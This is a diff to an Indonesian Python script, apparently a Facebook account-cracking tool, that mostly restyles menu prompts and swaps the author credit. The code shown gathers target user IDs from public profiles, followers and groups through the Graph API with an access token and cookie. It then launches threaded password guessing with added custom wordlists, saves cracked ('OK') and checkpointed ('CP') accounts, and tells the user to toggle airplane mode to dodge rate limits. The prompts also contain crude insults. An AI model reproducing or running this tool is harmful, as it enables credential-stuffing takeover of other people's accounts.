@@ -203,18 +203,18 @@ def menu(my_name,my_id):
 	os.system('clear')
 	banner()
 	ip = requests.get("https://api.ipify.org").text
-	gh = 'github.com/Al-Vino'
+	gh = 'github.com/ikiwz-XD'
 	cetak(nel('\tSelamat Datang [yellow]%s[white] Ngentod'%(my_name)))
-	print(f'>> Your Idz : '+str(my_id))
-	print(f'>> Your Ip  : {ip}')
-	print(f'>> Github   : {gh}')
+	print(f'[•] Your Idz : '+str(my_id))
+	print(f'[•] Your Ip  : {ip}')
+	print(f'[•] Github   : {gh}')
 	print('')
-	print('>> 1. Crack Publik ')
-	print('>> 2. Crack Follower ')
-	print('>> 3. Crack Grup   ')
-	print('>> 4. Crack File	')
-	print('>> 5. Hasil Crack  ')
-	print('>> 0. Keluar       ')
+	print('-[•]- 1. Crack Publik ')
+	print('-[•]- 2. Crack Follower ')
+	print('-[•]- 3. Crack Grup   ')
+	print('-[•]- 4. Crack File	')
+	print('-[•]- 5. Hasil Crack  ')
+	print('-[•]- 0. Keluar       ')
 	_____alvino__adijaya_____ = input('\n>> Pilih : ')
 	if _____alvino__adijaya_____ in ['1']:
 		dump_massal()
@@ -240,9 +240,9 @@ def error():
 	back()
 #-----------------[ HASIL-CRACK ]-----------------#
 def result():
-	print(f'>> 1. Hasil {h}OK{x} Anda ')
-	print(f'>> 2. Hasil {k}CP{x} Anda ')
-	print('>> 3. Kembali	')
+	print(f'[•] 1. Hasil {h}OK{x} Anda ')
+	print(f'[•] 2. Hasil {k}CP{x} Anda ')
+	print('[•] 3. Kembali	')
 	kz = input(f'\n>> Pilih : ')
 	if kz in ['2']:
 		try:vin = os.listdir('CP')
@@ -344,18 +344,18 @@ def dump_massal():
 	except IOError:
 		exit()
 	try:
-		jum = int(input('>> Mau Berapa Target Njing ? : '))
+		jum = int(input('[•] Mau Berapa Target Mas/Mba ? : '))
 	except ValueError:
-		print('>> Masukkan Angka Anjing, Malah Huruff ')
+		print('[•] Masukkan Angka Anjing, Malah Huruff ')
 		exit()
 	if jum<1 or jum>100:
-		print('>> Gagal Dump Idz ')
+		print('[•] Gagal Dump Idz ')
 		exit()
 	ses=requests.Session()
 	yz = 0
 	for met in range(jum):
 		yz+=1
-		kl = input('>> Masukkan Idz Yang Ke '+str(yz)+' : ')
+		kl = input('[•] Masukkan Idz Yang Ke '+str(yz)+' : ')
 		uid.append(kl)
 	for userr in uid:
 		try:
@@ -373,14 +373,14 @@ def dump_massal():
 			exit()
 	try:
 		print('')
-		print(f'>> Total Idz Yang Terkumpul🔥{h}'+str(len(id)))
+		print(f'[•] Total Idz Yang Terkumpul👍{h}'+str(len(id)))
 		setting()
 	except requests.exceptions.ConnectionError:
 		print(f'{x}')
-		print('>> Sinyal Lo kek Kontol ')
+		print('[•] Sinyal Lo kek Kontol ')
 		back()
 	except (KeyError,IOError):
-		print(f'>>{k} Pertemanan Tidak Public {x}')
+		print(f'[•]{k} Pertemanan Tidak Public {x}')
 		time.sleep(3)
 		back()
 #-------------------[ CRACK-PENGIKUT ]----------------#
@@ -390,20 +390,20 @@ def dump_pengikut():
 		cok = open('.cok.txt','r').read()
 	except IOError:
 		exit()
-	print('>> Ketik ( me ) Jika Ingin Crack Follower Sendiri ')
+	print('[•] Ketik ( me ) Jika Ingin Crack Follower Sendiri ')
 	pil = input('>> Masukkan Idz Target : ')
 	try:
 		koh2 = requests.get('https://graph.facebook.com/'+pil+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
 		for pi in koh2['subscribers']['data']:
 			try:id.append(pi['id']+'|'+pi['name'])
 			except:continue
-		print(f'>> Total Idz :{h} '+str(len(id)))
+		print(f'[•] Total Idz :{h} '+str(len(id)))
 		setting()
 	except requests.exceptions.ConnectionError:
-		print('>> Koneksi Internet Bermasalah ')
+		print('[•] Koneksi Internet Bermasalah ')
 		exit()
 	except (KeyError,IOError):
-		print('>> Gagal Mengambil Target ')
+		print('[•] Gagal Mengambil Target ')
 		exit()
 #------------------[ CRACK-GRUP ]-----------------#
 balmond = b+"["+h+"✓"+b+"]"
@@ -438,7 +438,7 @@ def grup():
 		time.sleep(0.5)
 		grup()
 	else:pass
-	print(f'{x}>> Nama Grup : {b}%s'%(berr2))
+	print(f'{x}[•] Nama Grup : {b}%s'%(berr2))
 	ggs = gn.find_all('table')
 	ang = []
 	for ff in ggs:
@@ -452,7 +452,7 @@ def grup():
 	if len(ang)==0:
 		print(" Anggota : -")
 	else:
-		print(f'{x}>> Anggota : {h}%s'%(ang[0]))
+		print(f'{x}[•] Anggota : {h}%s'%(ang[0]))
 	grup1(url)
 def grup1(urls):
 	use = []
@@ -598,12 +598,12 @@ def setting():
 	else:
 		print('>> Pilih Yang Bener Kontooll ')
 		exit()
-	print('>> 1. Mobile | rekomend |')
-	print('>> 2. Mbasic ')
-	print('>> 3. Touch  ')
-	print('>> 4. Mtouch ')
+	print('[•] 1. Mobile | rekomend |')
+	print('[•] 2. Mbasic ')
+	print('[•] 3. Touch  ')
+	print('[•] 4. Mtouch ')
 	print('')
-	hc = input('>> Pilih : ')
+	hc = input('[•] Pilih : ')
 	if hc in ['1','01']:
 		method.append('mobile')
 	elif hc in ['']:
@@ -618,19 +618,19 @@ def setting():
 	else:
 		method.append('mobile')
 	print('')
-	_jembot_ = input('>> Tambahkan Aplikasi ( Y/t ) ')
+	_jembot_ = input('[•] Tambahkan Aplikasi ( Y/t ) ')
 	if _jembot_ in ['']:
-		print('>> Pilih Yang Bener Kontol ')
+		print('[•] Pilih Yang Bener Kontol ')
 		back()
 	elif _jembot_ in ['y','Y']:
 		taplikasi.append('ya')
 	else:
 		taplikasi.append('no')
-	pwplus=input('>> Tambahkan Password Manual ( Y/t ) ')
+	pwplus=input('[•] Tambahkan Password Manual ( Y/t ) ')
 	if pwplus in ['y','Y']:
 		pwpluss.append('ya')
 		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] '))
-		pwku=input('>> Masukkan Password Tambahan : ')
+		pwku=input('[•] Masukkan Password Tambahan : ')
 		pwkuh=pwku.split(',')
 		for xpw in pwkuh:
 			pwnya.append(xpw)
@@ -639,11 +639,11 @@ def setting():
 	passwrd()
 #-------------------[ BAGIAN-WORDLIST ]------------#
 def passwrd():
-	print(f'>>>>> {m}•{k}•{h}•{x} Sedang Menggeser Matahari {m}•{k}•{h}•{x} <<<<< ')
+	print(f'[---------- {m}•{k}•{h}•{x} CRACK SEDANG BERLANGSUNG HARAP SABAR TOD !! {m}•{k}•{h}•{x} ----------] ')
 	print('')
-	print(f'>> Hasil {h}OK{x} Tersimpan Di : {h}OK/%s {x}'%(okc))
-	print(f'>> Hasil {k}CP{x} Tersimpan Di : {k}CP/%s {x}'%(cpc))
-	print(f'>> Mainkan Mode Pesawat Setiap {m}1k{x} Idz\n')
+	print(f'[•] Hasil {h}OK{x} Tersimpan Di : {h}OK/%s {x}'%(okc))
+	print(f'[•] Hasil {k}CP{x} Tersimpan Di : {k}CP/%s {x}'%(cpc))
+	print(f'>>•<< Mainkan Mode Pesawat Setiap {m}500{x} Idz\n')
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
